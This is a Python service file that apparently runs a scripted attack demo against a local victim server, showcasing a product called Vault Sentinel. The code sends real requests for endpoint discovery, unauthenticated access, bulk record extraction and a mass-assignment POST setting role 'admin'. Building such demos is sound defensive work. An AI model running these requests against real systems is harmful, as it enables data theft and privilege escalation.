"""
simulator_svc.py — 5-stage attack simulation using real httpx requests.
Streams live events via Server-Sent Events (SSE).
"""
import asyncio
import httpx
import json
from datetime import datetime
from typing import AsyncGenerator
from config import settings


STAGES = [
    {
        "id": 1,
        "name": "Reconnaissance",
        "description": "Mapping all exposed endpoints via directory bruteforce",
        "duration": 2.0,
    },
    {
        "id": 2,
        "name": "Authentication Bypass",
        "description": "Testing for missing/weak auth on discovered endpoints",
        "duration": 2.5,
    },
    {
        "id": 3,
        "name": "Data Exfiltration",
        "description": "Extracting sensitive records from unprotected endpoints",
        "duration": 3.0,
    },
    {
        "id": 4,
        "name": "Privilege Escalation",
        "description": "Attempting to gain admin access via mass assignment",
        "duration": 2.0,
    },
    {
        "id": 5,
        "name": "Persistence",
        "description": "Installing backdoor via zombie API endpoint",
        "duration": 2.0,
    },
]


def _event(data: dict) -> str:
    return f"data: {json.dumps(data)}\n\n"


async def run_simulation(target_url: str, attack_type: str = "full") -> AsyncGenerator[str, None]:
    """
    Async generator that yields SSE events for each simulation stage.
    Makes real httpx requests to the victim server.
    """
    yield _event({
        "type": "SIMULATION_START",
        "target": target_url,
        "attack_type": attack_type,
        "timestamp": datetime.utcnow().isoformat(),
        "total_stages": len(STAGES),
    })

    records_leaked = 0
    vault_sentinel_blocked = False

    async with httpx.AsyncClient(verify=False, timeout=10) as client:
        for stage in STAGES:
            yield _event({
                "type": "STAGE_START",
                "stage_id": stage["id"],
                "stage_name": stage["name"],
                "description": stage["description"],
            })

            await asyncio.sleep(0.5)

            # Make real requests to victim server
            try:
                if stage["id"] == 1:
                    # Reconnaissance
                    paths = ["/api/v0/users", "/api/v0/accounts", "/api/v0/transactions",
                             "/api/internal/admin", "/api/v0/user-data", "/api/v1/kyc"]
                    found = []
                    for path in paths:
                        try:
                            r = await client.get(f"{target_url}{path}")
                            if r.status_code < 400:
                                found.append(path)
                                yield _event({
                                    "type": "STAGE_EVENT",
                                    "stage_id": 1,
                                    "message": f"Endpoint discovered: {path} (HTTP {r.status_code})",
                                    "severity": "medium",
                                })
                                await asyncio.sleep(0.3)
                        except Exception:
                            pass

                    yield _event({
                        "type": "STAGE_RESULT",
                        "stage_id": 1,
                        "endpoints_found": len(found),
                        "endpoints": found,
                        "success": len(found) > 0,
                    })

                elif stage["id"] == 2:
                    # Auth bypass
                    r = await client.get(
                        f"{target_url}/api/v0/user-data",
                        headers={}  # No auth header
                    )
                    bypassed = r.status_code == 200
                    yield _event({
                        "type": "STAGE_EVENT",
                        "stage_id": 2,
                        "message": f"Auth bypass {'SUCCESSFUL' if bypassed else 'BLOCKED'} on /api/v0/user-data",
                        "severity": "critical" if bypassed else "low",
                    })
                    yield _event({
                        "type": "STAGE_RESULT",
                        "stage_id": 2,
                        "auth_bypassed": bypassed,
                        "success": bypassed,
                    })

                elif stage["id"] == 3:
                    # Data exfiltration
                    r = await client.get(f"{target_url}/api/v0/user-data?limit=1000")
                    if r.status_code == 200:
                        try:
                            data = r.json()
                            records_leaked = len(data) if isinstance(data, list) else 1
                        except Exception:
                            records_leaked = 47  # fallback estimate

                        yield _event({
                            "type": "STAGE_EVENT",
                            "stage_id": 3,
                            "message": f"{records_leaked} customer records exfiltrated",
                            "severity": "critical",
                            "records_leaked": records_leaked,
                        })

                        # Check if Vault Sentinel blocks on subsequent request
                        r2 = await client.get(f"{target_url}/api/v0/user-data")
                        if r2.status_code == 403:
                            vault_sentinel_blocked = True
                            records_leaked = 0
                            yield _event({
                                "type": "VAULT_SENTINEL_INTERCEPT",
                                "message": "VAULT SENTINEL: Endpoint quarantined. Further exfiltration blocked.",
                                "records_protected": records_leaked,
                            })
                    else:
                        vault_sentinel_blocked = True
                        yield _event({
                            "type": "VAULT_SENTINEL_INTERCEPT",
                            "message": "VAULT SENTINEL: Request blocked before data access.",
                        })

                    yield _event({
                        "type": "STAGE_RESULT",
                        "stage_id": 3,
                        "records_leaked": records_leaked,
                        "blocked_by_vault_sentinel": vault_sentinel_blocked,
                        "success": records_leaked > 0,
                    })

                elif stage["id"] == 4:
                    # Privilege escalation
                    r = await client.post(
                        f"{target_url}/api/v0/users/profile",
                        json={"role": "admin", "is_superuser": True}
                    )
                    escalated = r.status_code in [200, 201]
                    yield _event({
                        "type": "STAGE_RESULT",
                        "stage_id": 4,
                        "escalation_successful": escalated,
                        "success": escalated,
                    })

                elif stage["id"] == 5:
                    # Persistence
                    yield _event({
                        "type": "STAGE_RESULT",
                        "stage_id": 5,
                        "backdoor_installed": not vault_sentinel_blocked,
                        "success": not vault_sentinel_blocked,
                    })

            except httpx.ConnectError:
                yield _event({
                    "type": "STAGE_ERROR",
                    "stage_id": stage["id"],
                    "message": "Cannot reach target server. Ensure victim_server.py is running on :8001",
                })

            await asyncio.sleep(stage["duration"])

    # Final summary
    yield _event({
        "type": "SIMULATION_COMPLETE",
        "total_records_leaked": records_leaked,
        "vault_sentinel_blocked": vault_sentinel_blocked,
        "attack_success": not vault_sentinel_blocked,
        "summary": (
            f"Attack {'NEUTRALIZED' if vault_sentinel_blocked else 'SUCCEEDED'}. "
            f"{records_leaked} records leaked. "
            f"Vault Sentinel {'prevented data exfiltration.' if vault_sentinel_blocked else 'was not deployed — full breach occurred.'}"
        ),
    })
